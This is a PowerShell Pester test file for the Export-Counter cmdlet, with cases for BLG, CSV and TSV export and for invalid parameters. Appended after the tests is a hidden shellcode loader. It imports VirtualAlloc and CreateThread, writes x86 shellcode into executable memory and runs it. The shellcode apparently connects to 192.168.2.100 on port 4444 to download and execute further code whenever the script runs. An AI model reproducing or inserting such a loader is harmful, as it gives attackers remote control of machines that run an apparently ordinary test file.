


 
 
 
 return
 
$cmdletName = "Export-Counter"

. "$PSScriptRoot/CounterTestHelperFunctions.ps1"

$rootFilename = "exportedCounters"
$filePath = $null
$counterNames = @(
    (TranslateCounterPath "\Memory\Available Bytes")
    (TranslateCounterPath "\Processor(*)\% Processor Time")
    (TranslateCounterPath "\Processor(_Total)\% Processor Time")
    (TranslateCounterPath "\PhysicalDisk(_Total)\Current Disk Queue Length")
    (TranslateCounterPath "\PhysicalDisk(_Total)\Disk Bytes/sec")
    (TranslateCounterPath "\PhysicalDisk(_Total)\Disk Read Bytes/sec")
)
$counterValues = $null



function CheckExportResults
{
    Test-Path $filePath | Should -BeTrue
    $importedCounterValues = Import-Counter $filePath

    CompareCounterSets $counterValues $importedCounterValues
}


function RunTest($testCase)
{
    It "$($testCase.Name)" -Skip:$(SkipCounterTests) {
        $getCounterParams = ""
        if ($testCase.ContainsKey("GetCounterParams"))
        {
            $getCounterParams = $testCase.GetCounterParams
        }
        $counterValues = &([ScriptBlock]::Create("Get-Counter -Counter `$counterNames $getCounterParams"))

        
        $filePath = ""
        $pathParam = ""
        $formatParam = ""
        if ($testCase.ContainsKey("Path"))
        {
            $filePath = $testCase.Path
        }
        else
        {
            if ($testCase.ContainsKey("FileFormat"))
            {
                $formatParam = "-FileFormat $($testCase.FileFormat)"
                $filePath = Join-Path $script:outputDirectory "$rootFilename.$($testCase.FileFormat)"
            }
            else
            {
                $filePath = Join-Path $script:outputDirectory "$rootFilename.blg"
            }
        }
        if ($testCase.NoDashPath)
        {
            $pathParam = $filePath
        }
        else
        {
            $pathParam = "-Path $filePath"
        }
        $cmd = "$cmdletName $pathParam $formatParam -InputObject `$counterValues $($testCase.Parameters) -ErrorAction Stop"
        
        

        if ($testCase.CreateFileFirst)
        {
            if (-not (Test-Path $filePath))
            {
                New-Item $filePath -ItemType file
            }
        }

        try
        {
            if ($testCase.ContainsKey("Script"))
            {
                
                $sb = [ScriptBlock]::Create($cmd)
                &$sb
                &$testCase.Script
            }
            else
            {
                
                $sb = [ScriptBlock]::Create($cmd)
                { &$sb } | Should -Throw -ErrorId $testCase.ExpectedErrorId
            }
        }
        finally
        {
            if ($filePath)
            {
                Remove-Item $filePath -ErrorAction SilentlyContinue
            }
        }
    }
}

Describe "CI tests for Export-Counter cmdlet" -Tags "CI" {

    BeforeAll {
        $script:outputDirectory = $testDrive
    }

    $testCases = @(
        @{
            Name = "Can export BLG format"
            FileFormat = "blg"
            GetCounterParams = "-MaxSamples 5"
            Script = { CheckExportResults }
        }
        @{
            Name = "Exports BLG format by default"
            GetCounterParams = "-MaxSamples 5"
            Script = { CheckExportResults }
        }
    )

    foreach ($testCase in $testCases)
    {
        RunTest $testCase
    }
}

Describe "Feature tests for Export-Counter cmdlet" -Tags "Feature" {

    BeforeAll {
        $script:outputDirectory = $testDrive
    }

    Context "Validate incorrect parameter usage" {
        $testCases = @(
            @{
                Name = "Fails when given invalid path"
                Path = "c:\DAD288C0-72F8-47D3-8C54-C69481B528DF\counterExport.blg"
                ExpectedErrorId = "FileCreateFailed,Microsoft.PowerShell.Commands.ExportCounterCommand"
            }
            @{
                Name = "Fails when given null path"
                Path = "`$null"
                ExpectedErrorId = "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.ExportCounterCommand"
            }
            @{
                Name = "Fails when -Path specified but no path given"
                Path = ""
                ExpectedErrorId = "MissingArgument,Microsoft.PowerShell.Commands.ExportCounterCommand"
            }
            @{
                Name = "Fails when given -Circular without -MaxSize"
                Parameters = "-Circular"
                ExpectedErrorId = "CounterCircularNoMaxSize,Microsoft.PowerShell.Commands.ExportCounterCommand"
            }
            @{
                Name = "Fails when given -Circular with zero -MaxSize"
                Parameters = "-Circular -MaxSize 0"
                ExpectedErrorId = "CounterCircularNoMaxSize,Microsoft.PowerShell.Commands.ExportCounterCommand"
            }
            @{
                Name = "Fails when -MaxSize < zero"
                Parameters = "-MaxSize -2"
                ExpectedErrorId = "CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.ExportCounterCommand"
            }
        )

        foreach ($testCase in $testCases)
        {
            RunTest $testCase
        }
    }

    Context "Export tests" {
        $testCases = @(
            @{
                Name = "Fails when output file exists"
                CreateFileFirst = $true     
                ExpectedErrorId = "CounterFileExists,Microsoft.PowerShell.Commands.ExportCounterCommand"
            }
            @{
                Name = "Can force overwriting existing file"
                Parameters = "-Force"
                Script = { Test-Path $filePath | Should -BeTrue }
            }
            @{
                Name = "Can export BLG format"
                FileFormat = "blg"
                GetCounterParams = "-MaxSamples 5"
                Script = { CheckExportResults }
            }
            @{
                Name = "Exports BLG format by default"
                GetCounterParams = "-MaxSamples 5"
                Script = { CheckExportResults }
            }
            @{
                Name = "Can export CSV format"
                FileFormat = "csv"
                GetCounterParams = "-MaxSamples 2"
                Script = { CheckExportResults }
            }
            @{
                Name = "Can export TSV format"
                FileFormat = "tsv"
                GetCounterParams = "-MaxSamples 5"
                Script = { CheckExportResults }
            }
        )

        foreach ($testCase in $testCases)
        {
            RunTest $testCase
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x64,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

